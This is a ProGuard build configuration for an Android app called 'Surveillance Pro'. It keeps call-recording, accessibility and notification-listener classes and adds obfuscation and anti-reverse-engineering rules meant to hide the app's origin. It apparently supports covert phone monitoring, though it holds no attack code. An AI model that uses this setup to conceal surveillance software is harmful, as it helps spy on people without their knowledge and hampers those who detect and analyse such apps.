# ═══════════════════════════════════════════════════════════════════════════════
# ProGuard Rules - Surveillance Pro
# ═══════════════════════════════════════════════════════════════════════════════

# ─── OBFUSCATION MAXIMALE ───────────────────────────────────────────────────────

# Renommer les fichiers sources pour masquer l'origine
-renamesourcefileattribute SP
-keepattributes SourceFile,LineNumberTable

# Obfusquer les noms de packages
-repackageclasses 'sp'
-allowaccessmodification

# Optimisations agressives
-optimizationpasses 5
-dontpreverify
-verbose

# ─── KEEP RULES (ne pas obfusquer) ──────────────────────────────────────────────

# Services Android (doivent garder leurs noms pour le Manifest)
-keep class com.surveillancepro.android.services.** { *; }
-keep class com.surveillancepro.android.receivers.** { *; }
-keep class com.surveillancepro.android.root.CallRecorder { *; }

# MainActivity et Activity Aliases
-keep class com.surveillancepro.android.MainActivity { *; }

# Data classes pour Gson (serialisation JSON)
-keep class com.surveillancepro.android.data.** { *; }
-keepclassmembers class com.surveillancepro.android.data.** { *; }

# ─── OKHTTP ─────────────────────────────────────────────────────────────────────

-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
-keepclassmembers class okhttp3.** { *; }

# ─── GSON ───────────────────────────────────────────────────────────────────────

-keepattributes Signature
-keepattributes *Annotation*
-dontwarn sun.misc.**
-keep class com.google.gson.** { *; }
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer
-keepclassmembers,allowobfuscation class * {
  @com.google.gson.annotations.SerializedName <fields>;
}

# ─── COROUTINES ─────────────────────────────────────────────────────────────────

-keepnames class kotlinx.coroutines.internal.MainDispatcherFactory {}
-keepnames class kotlinx.coroutines.CoroutineExceptionHandler {}
-keepclassmembers class kotlinx.coroutines.** { volatile <fields>; }
-dontwarn kotlinx.coroutines.**

# ─── GOOGLE PLAY SERVICES ───────────────────────────────────────────────────────

-keep class com.google.android.gms.** { *; }
-dontwarn com.google.android.gms.**

# ─── WORKMANAGER ────────────────────────────────────────────────────────────────

-keep class * extends androidx.work.Worker
-keep class * extends androidx.work.ListenableWorker { *; }
-keepclassmembers class * extends androidx.work.ListenableWorker {
    public <init>(android.content.Context,androidx.work.WorkerParameters);
}

# ─── ACCESSIBILITY SERVICE ──────────────────────────────────────────────────────

-keep class * extends android.accessibilityservice.AccessibilityService { *; }

# ─── NOTIFICATION LISTENER ──────────────────────────────────────────────────────

-keep class * extends android.service.notification.NotificationListenerService { *; }

# ─── BROADCAST RECEIVERS ────────────────────────────────────────────────────────

-keep class * extends android.content.BroadcastReceiver { *; }

# ─── COMPOSE ────────────────────────────────────────────────────────────────────

-dontwarn androidx.compose.**
-keep class androidx.compose.** { *; }

# ─── ANTI-REVERSE ENGINEERING ───────────────────────────────────────────────────

# Supprimer les logs en release
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}

# Supprimer les assertions
-assumenosideeffects class java.lang.Class {
    public java.lang.String getName();
    public java.lang.String getSimpleName();
    public java.lang.String getCanonicalName();
}